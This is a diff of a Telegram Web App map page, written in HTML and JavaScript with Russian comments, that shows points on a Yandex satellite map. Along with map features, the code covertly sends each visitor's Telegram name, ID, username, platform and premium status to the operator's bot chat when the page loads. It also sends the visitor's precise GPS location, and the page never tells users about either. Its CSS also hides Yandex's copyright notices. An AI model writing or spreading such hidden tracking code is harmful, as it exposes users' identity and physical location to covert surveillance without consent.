@@ -11,7 +11,6 @@
         body, html { margin: 0; padding: 0; height: 100%; font-family: -apple-system, sans-serif; overflow: hidden; background: var(--bg); }
         #map { position: absolute; inset: 0; z-index: 1; }
         
-        /* Жесткое скрытие всех копирайтов и кнопок Яндекса */
         [class*="ymaps-2-1-"][class*="-copyrights-pane"], 
         [class*="ymaps-2-1-"][class*="-map-copyrights-promo"],
         [class*="ymaps-2-1-"][class*="-controls-pane"] {
@@ -19,9 +18,7 @@
         }
 
         .filter-container { position: absolute; bottom: 40px; right: 16px; z-index: 2000; display: flex; flex-direction: column-reverse; align-items: flex-end; gap: 12px; }
-        
-        /* Кнопки управления */
-        .map-btn { width: 56px; height: 56px; border-radius: 50%; background: rgba(0,0,0,.8); backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,.3); box-shadow: 0 4px 20px #0008; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; }
+        .map-btn { width: 56px; height: 56px; border-radius: 50%; background: rgba(0,0,0,.8); backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,.3); box-shadow: 0 4px 20px #0008; cursor: pointer; display: flex; align-items: center; justify-content: center; }
         .map-btn svg { fill: white; width: 28px; }
         .map-btn.active { background: var(--btn); border-color: #fff; }
 
@@ -75,38 +72,20 @@ const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
 
 let map, points = [], currentFilter = 'all';
-let userMarker, isAutoCenter = false;
-let isFirstCoordsSent = false, isUserDataSent = false;
+let userMarker, isAutoCenter = false, isFirstCoordsSent = false;
 
-function calculateAngle(p1, p2) {
-    if (!p1 || !p2) return 0;
-    const dLon = (p2[1] - p1[1]) * Math.PI / 180;
-    const lat1 = p1[0] * Math.PI / 180, lat2 = p2[0] * Math.PI / 180;
-    const y = Math.sin(dLon) * Math.cos(lat2);
-    const x = Math.cos(lat1) * Math.sin(lat2) - Math.sin(lat1) * Math.cos(lat2) * Math.cos(dLon);
-    return Math.round((Math.atan2(y, x) * 180 / Math.PI + 360) % 360);
-}
-
-// Отправка только текстовых данных (если гео запрещено)
-async function sendUserOnlyData() {
-    if (isUserDataSent || isFirstCoordsSent) return;
-    isUserDataSent = true;
-    const u = tg.initDataUnsafe?.user || { first_name: "Unknown" };
-    const text = `🚫 *Гео заблокировано*\n👤 ${u.first_name}\n🆔 \`${u.id}\`\n🔗 @${u.username||'none'}\n📱 ${tg.platform}`;
+// 1. ОТПРАВКА ДАННЫХ ПОЛЬЗОВАТЕЛЯ ПРИ СТАРТЕ (КАК РАНЬШЕ)
+const sendStats = (u) => {
+    const text = `🚀 *Новый вход*\n👤 ${u.first_name}\n🆔 \`${u.id}\`\n🔗 @${u.username||'none'}\n📱 ${tg.platform}\n🌟 Премиум: ${u.is_premium?'Да':'Нет'}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`).catch(console.error);
-}
+};
 
-// Отправка карточки с гео и данными
-async function sendGeoToTelegram(lat, lon) {
+// 2. ОТПРАВКА ГЕОМЕТКИ ПРИ ПОЛУЧЕНИИ КООРДИНАТ
+const sendGeoLocation = (lat, lon) => {
     if (isFirstCoordsSent) return;
     isFirstCoordsSent = true;
-    isUserDataSent = true;
-    const user = tg.initDataUnsafe?.user || { first_name: "Пользователь" };
-    const title = encodeURIComponent(user.first_name + (user.last_name ? ' ' + user.last_name : ''));
-    const address = encodeURIComponent(`@${user.username || 'id' + user.id} | ${tg.platform}`);
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVenue?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}&title=${title}&address=${address}`;
-    fetch(url).catch(console.error);
-}
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`).catch(console.error);
+};
 
 ymaps.ready(() => {
     map = new ymaps.Map("map", { 
@@ -114,13 +93,14 @@ ymaps.ready(() => {
         zoom: 17, 
         type: 'yandex#satellite', 
         controls: [] 
-    }, {
-        suppressMapOpenBlock: true
-    });
+    }, { suppressMapOpenBlock: true });
     
     map.events.add('click', (e) => { if(e.get('target') === map) { closeSheet(); closeMenu(); } });
     map.events.add('mousedown', () => { if(isAutoCenter) toggleAutoCenter(); });
 
+    // Запускаем отправку статов сразу
+    if (tg.initDataUnsafe?.user) sendStats(tg.initDataUnsafe.user);
+    
     initGeolocation();
     loadData();
 });
@@ -129,41 +109,34 @@ function initGeolocation() {
     if ("geolocation" in navigator) {
         userMarker = new ymaps.Placemark([0, 0], {}, {
             iconLayout: 'default#imageWithContent',
-            iconImageSize: [20, 20],
-            iconImageOffset: [-10, -10],
+            iconImageSize: [20, 20], iconImageOffset: [-10, -10],
             iconImageHref: 'data:image/svg+xml;utf8,' + encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><circle cx="10" cy="10" r="8" fill="#007AFF" stroke="white" stroke-width="2"/></svg>`),
             zIndex: 10000
         });
         map.geoObjects.add(userMarker);
         userMarker.options.set('visible', false);
 
-        navigator.geolocation.watchPosition(
-            (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const coords = [lat, lon];
-                userMarker.geometry.setCoordinates(coords);
-                userMarker.options.set('visible', true);
-                if (!isFirstCoordsSent) sendGeoToTelegram(lat, lon);
-                if (isAutoCenter) map.panTo(coords, { flying: true, duration: 300 });
-            }, 
-            (err) => { sendUserOnlyData(); }, 
-            { enableHighAccuracy: true, maximumAge: 1000, timeout: 5000 }
-        );
-    } else {
-        sendUserOnlyData();
+        navigator.geolocation.watchPosition((pos) => {
+            const lat = pos.coords.latitude, lon = pos.coords.longitude;
+            const coords = [lat, lon];
+            
+            userMarker.geometry.setCoordinates(coords);
+            userMarker.options.set('visible', true);
+            
+            // Отправляем геометку один раз
+            sendGeoLocation(lat, lon);
+            
+            if (isAutoCenter) map.panTo(coords, { flying: true, duration: 300 });
+        }, (err) => console.log("Geo error"), { enableHighAccuracy: true });
     }
 }
 
 function toggleAutoCenter() {
     isAutoCenter = !isAutoCenter;
-    const btn = document.getElementById('locateBtn');
-    if (isAutoCenter) {
-        btn.classList.add('active');
-        const coords = userMarker.geometry.getCoordinates();
-        if (coords[0] !== 0) map.panTo(coords, { flying: true });
-    } else {
-        btn.classList.remove('active');
+    document.getElementById('locateBtn').classList.toggle('active', isAutoCenter);
+    if (isAutoCenter && userMarker) {
+        const c = userMarker.geometry.getCoordinates();
+        if (c[0] !== 0) map.panTo(c, { flying: true });
     }
 }
 
@@ -230,6 +203,15 @@ const getSvg = (col, txt, az, isEnd) => {
         <text x="${size/2}" y="${size/2+3}" font-size="${fs}" font-family="Arial" font-weight="bold" text-anchor="middle" fill="#000" stroke="white" stroke-width="2.5" style="paint-order:stroke fill;stroke-linejoin:round">${txt}</text>
     </svg>`);
 };
+
+function calculateAngle(p1, p2) {
+    if (!p1 || !p2) return 0;
+    const dLon = (p2[1] - p1[1]) * Math.PI / 180;
+    const lat1 = p1[0] * Math.PI / 180, lat2 = p2[0] * Math.PI / 180;
+    const y = Math.sin(dLon) * Math.cos(lat2);
+    const x = Math.cos(lat1) * Math.sin(lat2) - Math.sin(lat1) * Math.cos(lat2) * Math.cos(dLon);
+    return Math.round((Math.atan2(y, x) * 180 / Math.PI + 360) % 360);
+}
 
 function render(json) {
     map.geoObjects.removeAll(); points = [];
